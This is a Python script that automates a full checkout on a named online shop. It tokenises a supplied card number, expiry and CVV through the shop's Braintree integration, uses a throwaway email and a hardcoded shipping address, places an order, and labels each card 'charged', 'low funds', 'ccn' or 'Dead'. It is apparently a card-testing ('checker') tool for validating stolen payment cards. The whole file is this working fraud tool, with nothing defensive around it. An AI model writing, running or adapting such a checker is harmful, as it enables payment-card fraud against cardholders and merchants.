import base64
from utilsdf.functions import  capture, random_email, clean_text
from httpx import AsyncClient


async def pepe(cc, month, year, cvv):
    async with AsyncClient(
    ) as session:
        mail = random_email()

        r = await session.get(
            "https://www.spicylegs.com/p-76998-adult-green-elf-shoes.aspx",
        )

        h2 = {
            "Host": "www.spicylegs.com",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.spicylegs.com",
            "Referer": "https://www.spicylegs.com/p-76998-adult-green-elf-shoes.aspx",
        }

        p2 = "ProductId=76998&VariantId=249374&CartRecordId=0&UpsellProducts=&ReturnUrl=%2Fp-76998-adult-green-elf-shoes.aspx&IsWishlist=False&Quantity=1"

        r2 = await session.post(
            "https://www.spicylegs.com/minicart/ajaxaddtocart",
            headers=h2,
            data=p2,
        )
        t2 = r2.text
        rt = capture(t2, '"__RequestVerificationToken" type="hidden" value="', '"')

        r3 = await session.get(
            "https://www.spicylegs.com/checkoutcreditcard/creditcard",
        )
        t3 = r3.text
        bt = capture(t3, '"braintreeToken" value="', '"')
        au2 = base64.b64decode(bt).decode("utf-8")
        au = capture(au2, '"authorizationFingerprint":"', '"')
        me = capture(au2, "merchants/", "/")

        r4 = await session.get(
            f"https://api.braintreegateway.com/merchants/{me}/client_api/v1/payment_methods/credit_cards?sharedCustomerIdentifierType=undefined&braintreeLibraryVersion=braintree%2Fweb%2F2.15.7&authorizationFingerprint={au}&share=undefined&creditCard%5BbillingAddress%5D%5BpostalCode%5D=10027&creditCard%5Bnumber%5D={cc}&creditCard%5Bcvv%5D={cvv}&creditCard%5BexpirationMonth%5D={month}&creditCard%5BexpirationYear%5D={year}&creditCard%5Boptions%5D%5Bvalidate%5D=false&_meta%5Bintegration%5D=custom&_meta%5Bsource%5D=form&_method=POST&callback=callback_jsonbd82022094174c8aae0ec640c7562fa3",
        )
        t4 = r4.text
        ct = capture(t4, '"cardType":"', '"')
        no = capture(t4, '"nonce":"', '"')

        h5 = {
            "Host": "www.spicylegs.com",
            "Origin": "https://www.spicylegs.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://www.spicylegs.com/checkoutcreditcard/creditcard",
        }

        p5 = f"braintreeToken={bt}&braintreePaymentMethod=CreditCard&braintreeCardType={ct}&braintreeNonce={no}"

        r5 = await session.post(
            "https://www.spicylegs.com/braintree/braintreecreditcard",
            headers=h5,
            data=p5,
        )

        h6 = {
            "Host": "www.spicylegs.com",
            "Origin": "https://www.spicylegs.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://www.spicylegs.com/shoppingcart.aspx",
        }

        p6 = f"Email={mail}"

        r6 = await session.post(
            "https://www.spicylegs.com/checkoutaccount/setemail",
            headers=h6,
            data=p6,
        )

        h7 = {
            "Host": "www.spicylegs.com",
            "Origin": "https://www.spicylegs.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://www.spicylegs.com/address/detail?makePrimary=True&addressType=Shipping&returnurl=%2Fshoppingcart.aspx",
        }

        p7 = "Address.Id=&MakePrimary=True&Address.Country=United+States&Address.Name=Sachio+YT&Address.Phone=19006318646&Address.Address1=118+W+132nd+St&Address.Address2=&Address.Suite=&Address.Company=&Address.Zip=10027&Address.City=New+York&Address.State=NY"

        r7 = await session.post(
            "https://www.spicylegs.com/address/detail?makePrimary=True&addressType=Shipping&returnurl=%2Fshoppingcart.aspx",
            headers=h7,
            data=p7,
        )

        h8 = {
            "Host": "www.spicylegs.com",
            "Origin": "https://www.spicylegs.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://www.spicylegs.com/shoppingcart.aspx",
        }

        p8 = "SelectedShippingMethodId=12"

        r8 = await session.post(
            "https://www.spicylegs.com/checkoutshippingmethod/shippingmethod",
            headers=h8,
            data=p8,
        )

        h9 = {
            "Host": "www.spicylegs.com",
            "Origin": "https://www.spicylegs.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Referer": "https://www.spicylegs.com/shoppingcart.aspx",
        }

        p9 = f"__RequestVerificationToken={rt}&OkToEmailSelected=False"

        r9 = await session.post(
            "https://www.spicylegs.com/checkout/placeorder",
            headers=h9,
            data=p9,
        )
        t9 = r9.text
        msg2 = capture(t9, '<div class="notice-wrap">', "</div>")
        if msg2:
            msg = clean_text(msg2)
        else:
            with open("pepe.html", "w") as a:
                a.write(t9)
            msg = "Thanks"

        if r9.status_code == 302 or msg == "Thanks":
            status = "Approved ✅ -» charged!"
            msg = "Thanks -» $13.85"
        elif msg == "Insufficient Funds":
            status = "Approved ✅ -» low funds"
        elif msg == "Card Issuer Declined CVV":
            status = "Approved ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
